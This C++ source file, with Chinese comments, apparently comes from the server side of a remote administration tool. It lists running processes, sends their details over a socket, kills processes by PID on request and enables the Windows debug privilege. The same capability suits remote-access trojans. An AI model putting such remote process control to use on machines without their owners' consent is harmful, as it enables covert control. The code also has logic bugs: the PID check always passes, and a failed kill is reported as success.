#include "StdAfx.h"
#include "TaskManager.h"

CTaskManager::CTaskManager(void)
{
}

CTaskManager::~CTaskManager(void)
{
}

void CTaskManager::SendProgressList( IN SOCKET sock, IN int nTag)
{
	GetSysProgressInfo(sock, nTag);   //bTag这个关键字是来区别结束掉进程是否成功，0 -- 未知(不管)， 1--结束成功 , 2--结束失败
}

void CTaskManager::TaskkillProc(IN PROGRESS_S tagProInfo, IN SOCKET sock)
{
	UINT32 result = ERROR_SUCCESS;
	CString strExecInfo = _T("ERROR");  //执行结果
    bool bSuccess = true;
	int nTag = 2;  //默认是结束失败
	result = KillPorcessByPID(tagProInfo.nPid, &bSuccess);
	if (ERROR_SUCCESS == result)
	{
		if (bSuccess)  //关闭进程成功
		{
			strExecInfo = _T("OK");
			nTag = 1;   //结束成功
		}
	}
	Sleep(50);
	SendProgressList(sock, nTag);  //结束掉进程后重新刷列表
}

//根据进程的PID来结束指定进程
UINT32 CTaskManager::KillPorcessByPID(IN const DWORD dwProcessPid, OUT bool* pbSuccess )
{
	UINT32 result = ERROR_SUCCESS;
	bool bSuccess = true;
	try
	{
		if (-1 != dwProcessPid || 0 != dwProcessPid)
		{
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessPid);
			if (NULL == hProcess)
			{
				result = GetLastError();
				bSuccess = false;
				throw result;
			} 
			else  //打开进程成功
			{
				if (!TerminateProcess(hProcess,0))
				{
					result = GetLastError();
					throw result;
				}
				CloseHandle(hProcess);
			}
		}
		else
		{
			bSuccess = false;
		}
	}
	catch (UINT32)
	{
	}
	*pbSuccess = bSuccess;
	return result;
}

UINT32 CTaskManager::GetSysProgressInfo(IN SOCKET sock, IN int nTag)
{
	UINT32 result = ERROR_SUCCESS;
	PROGRESS_S tagProInfo;
	memset(&tagProInfo, 0, sizeof(PROGRESS_S));

	PROCESSENTRY32 pe32;
	//在使用结构之前，先设置大小
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//给系统内的所有进程拍一个快照
	try
	{
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (INVALID_HANDLE_VALUE == hProcessSnap)
		{
			result = GetLastError();
			throw result;
		}
		//遍历快照进程，轮流显示每个进程信息
		BOOL bRet = ::Process32First(hProcessSnap, &pe32);
		if (!bRet)
		{
			result = GetLastError();
			throw result;
		}
		else
		{
			while (bRet)
			{
				memcpy(tagProInfo.szProName, pe32.szExeFile, sizeof(tagProInfo.szProName));  //进程名
				tagProInfo.nPid = pe32.th32ProcessID;  //进程的PID
				CString strProPath = _T(""); //进程路径
				BOOL bSuccess = GetProcessFilePathByPId(tagProInfo.nPid, strProPath);
				wsprintfW(tagProInfo.szProPath, strProPath);  //获取进程路径
				PROGRESS_LEVEL nProLevel = GetProcessLevel(tagProInfo.nPid);
				tagProInfo.nLevel = nProLevel;   //进程的优先级
				tagProInfo.nThreadCount = pe32.cntThreads;  //线程数
                if (1 == nTag || 2 == nTag)  //这个用来表示是结束进程操作
				{
					tagProInfo.nTag = nTag; 
				}
				else
				{
					tagProInfo.nTag = 0;
				}
				bRet = ::Process32Next(hProcessSnap,&pe32);  

				MSGINFO_S tagMsgInfo;
				memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
				tagMsgInfo.Msg_id = CMD_PROGRESS;
				memcpy((char*)tagMsgInfo.context, (char*)&tagProInfo, sizeof(PROGRESS_S));
				bool bSend = true;
				m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSend);
				if (!bSend)
				{
					printf("服务端获取进程信息失败! 错误码: %d\n", result);
				}

			}
			::CloseHandle(hProcessSnap);  //清除SNAPSHOT对象
		}
	}
	catch (UINT32)
	{
	}
	return result;
}

//根据进程的ID，获取进程所在的路径
BOOL CTaskManager::GetProcessFilePathByPId(IN const DWORD dwProcessId, OUT CString & cstrPath )
{
	HANDLE hProcess = NULL;
	BOOL bSuccess = FALSE;

	// 由于进程权限问题，有些进程是无法被OpenProcess的，如果将调用进程的权限
	// 提到“调试”权限，则可能可以打开更多的进程
	hProcess = OpenProcess( 
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , 
		FALSE, dwProcessId );
	if (EnableDebugPrivilege())  //提示权限
	{
		do 
		{
			if ( NULL == hProcess )
			{
				// 打开句柄失败，比如进程为0的进程
				break;
			}
			// 用于保存文件路径，扩大一位，是为了保证不会有溢出
			TCHAR szPath[MAX_PATH + 1] = {0};

			// 模块句柄
			HMODULE hMod = NULL;
			// 这个参数在这个函数中没用处，仅仅为了调用EnumProcessModules
			DWORD cbNeeded = 0;
			// 获取路径
			// 因为这个函数只是要获得进程的Exe路径，因为Exe路径正好在返回的数据的
			// 第一位，则不用去关心cbNeeded，hMod里即是Exe文件的句柄.
			// If this function is called from a 32-bit application running on WOW64, 
			// it can only enumerate the modules of a 32-bit process. 
			// If the process is a 64-bit process, 
			// this function fails and the last error code is ERROR_PARTIAL_COPY (299).
			if( FALSE == EnumProcessModules( hProcess, &hMod, 
				sizeof( hMod ), &cbNeeded ) )
			{
				break;
			}
			// 通过模块句柄，获取模块所在的文件路径，此处即为进程路径。
			// 传的Size为MAX_PATH，而不是MAX_PATH+1，是因为保证不会存在溢出问题
			if ( 0 == GetModuleFileNameEx( hProcess, hMod, szPath, MAX_PATH ) )
			{
				break;
			}
			// 保存文件路径
			cstrPath = szPath;
			// 查找成功了
			bSuccess = TRUE;
		} while( 0 );
	}
	// 释放句柄
	if ( NULL != hProcess )
	{
		CloseHandle( hProcess );
		hProcess = NULL;
	}
	return bSuccess;
}

//给枚举的进程增加SE_DEBUG_NAME权限 , 可以枚举出更多进程路径
bool CTaskManager::EnableDebugPrivilege()   
{   
	HANDLE hToken;   
	LUID sedebugnameValue;   
	TOKEN_PRIVILEGES tkp;   
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{   
		return  FALSE;   
	}   
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))  
	{   
		CloseHandle(hToken);   
		return false;   
	}   
	tkp.PrivilegeCount = 1;   
	tkp.Privileges[0].Luid = sedebugnameValue;   
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) 
	{   
		CloseHandle(hToken);   
		return false;   
	}   
	return true;   
}

//获取进程的优先级
PROGRESS_LEVEL CTaskManager::GetProcessLevel(IN const DWORD dwProcessId)
{
	HANDLE hProcess = NULL;
	hProcess = OpenProcess( 
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , 
		FALSE, dwProcessId );
	PROGRESS_LEVEL proLev = UNKNOWN_LEVEL;

	if (NULL != hProcess)
	{
		DWORD dwLevel = GetPriorityClass(hProcess);
		switch (dwLevel)
		{
		case NORMAL_PRIORITY_CLASS:  //标准
			{
				proLev = NORMAL;
			}
			break;
		case IDLE_PRIORITY_CLASS:   //低
			{
				proLev = IDLE;
			}
			break;
		case REALTIME_PRIORITY_CLASS:  //实时
			{
				proLev = REALTIME;
			}
			break;
		case HIGH_PRIORITY_CLASS:  //高
			{
				proLev = HIGH;
			}
			break;
		case ABOVE_NORMAL_PRIORITY_CLASS:  //高于标准
			{
				proLev = ABOVENORMAL;
			}
			break;
		case BELOW_NORMAL_PRIORITY_CLASS:  //低于标准
			{
				proLev = NORMAL;
			}
			break;
		default:
			{
				proLev = UNKNOWN_LEVEL; //未知
				break;  
			}
		}
	}
	else
	{
		printf("获取进程的优先级失败!\n");
	}
	return proLev;
}